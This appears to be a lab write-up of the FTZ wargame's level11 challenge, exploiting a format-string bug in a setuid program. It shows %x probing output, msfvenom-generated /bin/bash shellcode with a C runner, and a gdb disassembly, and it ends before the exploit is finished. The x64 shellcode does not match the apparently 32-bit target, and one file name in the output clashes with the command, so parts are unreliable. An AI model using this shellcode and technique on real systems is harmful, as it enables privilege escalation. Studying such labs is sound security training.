# Level11

## This level's goal

- FSB(Format String Bug)
- Shell code

***

```
[level11@ftz level11]$ ls -l
total 28
-rwsr-x---    1 level12  level11     13733 Mar  8  2003 attackme
-rw-r-----    1 root     level11       168 Mar  8  2003 hint
drwxr-xr-x    2 root     level11      4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level11      4096 Jan 14  2009 tmp

[level11@ftz level11]$ cat hint

#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}
```

The hint seems the vulnerability of FSB and BOF   
I will exploit with FSB

```
[level11@ftz level11]$ ./attackme
Segmentation fault
```

This seems that Segmentation falut will be printed if there is no argument and then the argv[1] is the value of garbage.

```
[level11@ftz level11]$ ./attackme "AAAA"
AAAA
[level11@ftz level11]$ ./attackme "AAAA %x"
AAAA bffffc40
[level11@ftz level11]$ ./attackme "AAAA %x %x"
AAAA bffffc3d bffff300
[level11@ftz level11]$ ./attackme "AAAA %x %x %x"
AAAA bffffc3a bfffdb80 1
[level11@ftz level11]$ ./attackme "AAAA %x %x %x %x"
AAAA bffffc37 bfffde00 1 41414141
```

AAAA means 41414141

```
┌──(root💀kali)-[/test]
└─# msfvenom -p linux/x64/exec CMD=/bin/bash -f c -o bashcode.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 46 bytes
Final size of c file: 220 bytes
Saved as: shellcode.c

┌──(root💀kali)-[/test]
└─# cat bashcode.c 
unsigned char buf[] = 
"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
"\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69"
"\x6e\x2f\x62\x61\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
"\x05";

[level11@ftz tmp]$ cat shellex.c
#include <stdio.h>

char shellcode[] ="\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
"\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69"
"\x6e\x2f\x62\x61\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
"\x05";

int main()
{
        (*(void (*)()) shellcode)();
}

```

```
[level11@ftz level11]$ gdb attackme
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:    push   %ebp
0x08048471 <main+1>:    mov    %esp,%ebp
0x08048473 <main+3>:    sub    $0x108,%esp
0x08048479 <main+9>:    sub    $0x8,%esp
0x0804847c <main+12>:   push   $0xc14
0x08048481 <main+17>:   push   $0xc14
0x08048486 <main+22>:   call   0x804834c <setreuid>
0x0804848b <main+27>:   add    $0x10,%esp
0x0804848e <main+30>:   sub    $0x8,%esp
0x08048491 <main+33>:   mov    0xc(%ebp),%eax
0x08048494 <main+36>:   add    $0x4,%eax
0x08048497 <main+39>:   pushl  (%eax)
0x08048499 <main+41>:   lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:   push   %eax
0x080484a0 <main+48>:   call   0x804835c <strcpy>
0x080484a5 <main+53>:   add    $0x10,%esp
0x080484a8 <main+56>:   sub    $0xc,%esp
0x080484ab <main+59>:   lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:   push   %eax
0x080484b2 <main+66>:   call   0x804833c <printf>
0x080484b7 <main+71>:   add    $0x10,%esp
0x080484ba <main+74>:   leave
0x080484bb <main+75>:   ret
0x080484bc <main+76>:   nop
0x080484bd <main+77>:   nop
0x080484be <main+78>:   nop
0x080484bf <main+79>:   nop
```

